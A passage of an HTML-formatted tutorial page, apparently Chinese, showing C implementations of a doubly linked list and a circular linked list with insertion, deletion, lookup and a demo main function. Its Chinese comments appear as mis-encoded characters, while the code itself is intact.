class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…çš„èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span> &amp;&amp; currentIndex &lt; index) &#123;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p; <span class="hljs-comment">// å¦‚æœç´¢å¼•è¶…å‡ºèŒƒå›´ï¼Œå°†è¿”å› NULL</span><br>&#125;<br><br><span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *head = <span class="hljs-built_in">InitList</span>(); <span class="hljs-comment">// åˆå§‹åŒ–åŒå‘é“¾è¡¨</span><br><br>    <span class="hljs-comment">// æ’å…¥ä¸€äº›èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">10</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">20</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">30</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é“¾è¡¨å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">InsertBefore</span>(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">InsertAfter</span>(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">Delete</span>(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">DeleteAt</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ç´¢å¼•ä¸º2çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    Node *foundNode = <span class="hljs-built_in">FindByValue</span>(head, <span class="hljs-number">30</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹ï¼Œåœ°å€ä¸ºï¼š%p\n&quot;</span>, foundNode);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°å€¼ä¸º30çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    foundNode = <span class="hljs-built_in">FindByIndex</span>(head, <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (foundNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹ï¼Œå€¼ä¸ºï¼š%d\n&quot;</span>, foundNode-&gt;data);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æœªæ‰¾åˆ°ç´¢å¼•ä¸º1çš„èŠ‚ç‚¹\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br>    <span class="hljs-type">int</span> length = <span class="hljs-built_in">GetLength</span>(head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨é•¿åº¦ä¸ºï¼š%d\n&quot;</span>, length);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é“¾è¡¨å†…å­˜</span><br>    Node *p = head;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        Node *temp = p;<br>        p = p-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å¾ªç¯é“¾è¡¨"><a href="#å¾ªç¯é“¾è¡¨" class="headerlink" title="å¾ªç¯é“¾è¡¨"></a>å¾ªç¯é“¾è¡¨</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰å¾ªç¯é“¾è¡¨èŠ‚ç‚¹</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// å­˜å‚¨æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *prev;  <span class="hljs-comment">// æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>&#125; Node;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å¾ªç¯é“¾è¡¨</span><br><span class="hljs-function">Node* <span class="hljs-title">InitList</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// åˆå§‹åŒ–ä¸ºç©ºé“¾è¡¨</span><br>&#125;<br><br><span class="hljs-comment">// åœ¨é“¾è¡¨æœ«å°¾æ’å…¥æ–°èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">Insert</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;next = newNode;<br>        newNode-&gt;prev = newNode;<br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// å¦‚æœé“¾è¡¨ä¸ºç©ºï¼Œæ–°èŠ‚ç‚¹ä½œä¸ºå¤´èŠ‚ç‚¹</span><br>    &#125;<br><br>    Node *tail = head-&gt;prev; <span class="hljs-comment">// è·å–é“¾è¡¨çš„å°¾èŠ‚ç‚¹</span><br>    tail-&gt;next = newNode;<br>    newNode-&gt;prev = tail;<br>    newNode-&gt;next = head;<br>    head-&gt;prev = newNode;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹å‰æ’å…¥æ–°èŠ‚ç‚¹ï¼ˆå‰æ’æ³•ï¼‰</span><br><span class="hljs-function">Node* <span class="hljs-title">InsertBefore</span><span class="hljs-params">(Node *head, Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    Node *prevNode = target-&gt;prev;<br>    newNode-&gt;next = target;<br>    newNode-&gt;prev = prevNode;<br>    target-&gt;prev = newNode;<br>    prevNode-&gt;next = newNode;<br><br>    <span class="hljs-keyword">if</span> (target == head) &#123; <span class="hljs-comment">// å¦‚æœç›®æ ‡èŠ‚ç‚¹æ˜¯å¤´èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">return</span> newNode; <span class="hljs-comment">// æ–°èŠ‚ç‚¹ä½œä¸ºæ–°çš„å¤´èŠ‚ç‚¹</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// åœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹åæ’å…¥æ–°èŠ‚ç‚¹ï¼ˆåæ’æ³•ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertAfter</span><span class="hljs-params">(Node *target, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç›®æ ‡èŠ‚ç‚¹ä¸ºç©ºï¼Œæ— æ³•æ’å…¥\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br><br>    Node *nextNode = target-&gt;next;<br>    newNode-&gt;next = nextNode;<br>    newNode-&gt;prev = target;<br>    target-&gt;next = newNode;<br>    nextNode-&gt;prev = newNode;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é“¾è¡¨</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintList</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(å›åˆ°å¤´èŠ‚ç‚¹)\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">Delete</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">if</span> (p-&gt;next == p) &#123; <span class="hljs-comment">// é“¾è¡¨ä¸­åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</span><br>                <span class="hljs-built_in">free</span>(p);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            Node *prevNode = p-&gt;prev;<br>            Node *nextNode = p-&gt;next;<br>            prevNode-&gt;next = nextNode;<br>            nextNode-&gt;prev = prevNode;<br>            <span class="hljs-keyword">if</span> (p == head) &#123;<br>                head = nextNode; <span class="hljs-comment">// å¦‚æœåˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹ï¼Œæ›´æ–°å¤´èŠ‚ç‚¹</span><br>            &#125;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br><br>    <span class="hljs-keyword">return</span> head; <span class="hljs-comment">// æœªæ‰¾åˆ°èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">DeleteAt</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;æ— æ•ˆçš„ç´¢å¼•\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (currentIndex == index) &#123;<br>            <span class="hljs-keyword">if</span> (p-&gt;next == p) &#123; <span class="hljs-comment">// é“¾è¡¨ä¸­åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹</span><br>                <span class="hljs-built_in">free</span>(p);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            Node *prevNode = p-&gt;prev;<br>            Node *nextNode = p-&gt;next;<br>            prevNode-&gt;next = nextNode;<br>            nextNode-&gt;prev = prevNode;<br>            <span class="hljs-keyword">if</span> (p == head) &#123;<br>                head = nextNode; <span class="hljs-comment">// å¦‚æœåˆ é™¤çš„æ˜¯å¤´èŠ‚ç‚¹ï¼Œæ›´æ–°å¤´èŠ‚ç‚¹</span><br>            &#125;<br>            <span class="hljs-built_in">free</span>(p);<br>            <span class="hljs-keyword">return</span> head;<br>        &#125;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ç´¢å¼•è¶…å‡ºèŒƒå›´\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br><br><span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByValue</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (p-&gt;data == value) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// æœªæ‰¾åˆ°åŒ¹é…çš„èŠ‚ç‚¹</span><br>&#125;<br><br><span class="hljs-comment">// æŒ‰åºå·æŸ¥æ‰¾èŠ‚ç‚¹</span><br><span class="hljs-function">Node* <span class="hljs-title">FindByIndex</span><span class="hljs-params">(Node *head, <span class="hljs-type">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span> || index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    Node *p = head;<br>    <span class="hljs-type">int</span> currentIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (currentIndex == index) &#123;<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>        p = p-&gt;next;<br>        currentIndex++;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// å¦‚æœç´¢å¼•è¶…å‡ºèŒƒå›´ï¼Œå°†è¿”å› NULL</span><br>&#125;<br><br><span class="hljs-comment">// æ±‚é“¾è¡¨é•¿åº¦</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLength</span><span class="hljs-params">(Node *head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node *p = head;<br>    <span class="hljs-keyword">do</span> &#123;<br>        length++;<br>        p = p-&gt;next;<br>    &#125; <span class="hljs-keyword">while</span> (p != head);<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Node *head = <span class="hljs-built_in">InitList</span>(); <span class="hljs-comment">// åˆå§‹åŒ–å¾ªç¯é“¾è¡¨</span><br><br>    <span class="hljs-comment">// æ’å…¥ä¸€äº›èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">10</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">20</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">30</span>);<br>    head = <span class="hljs-built_in">Insert</span>(head, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é“¾è¡¨å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">InsertBefore</span>(head, head-&gt;next-&gt;next, <span class="hljs-number">25</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º30çš„èŠ‚ç‚¹ä¹‹å‰æ’å…¥å€¼ä¸º25çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹</span><br>    <span class="hljs-built_in">InsertAfter</span>(head-&gt;next-&gt;next, <span class="hljs-number">27</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åœ¨å€¼ä¸º25çš„èŠ‚ç‚¹ä¹‹åæ’å…¥å€¼ä¸º27çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">Delete</span>(head, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤å€¼ä¸º20çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// æŒ‰åºå·åˆ é™¤èŠ‚ç‚¹</span><br>    head = <span class="hljs-built_in">DeleteAt</span>(head, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;åˆ é™¤ç´¢å¼•ä¸º2çš„èŠ‚ç‚¹åé“¾è¡¨å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintList</span>(head);<br><br>    <span class="hljs-comment">// æŒ‰å€¼æŸ¥æ‰¾èŠ‚ç‚¹</span><br>    Node *foundNode = <span 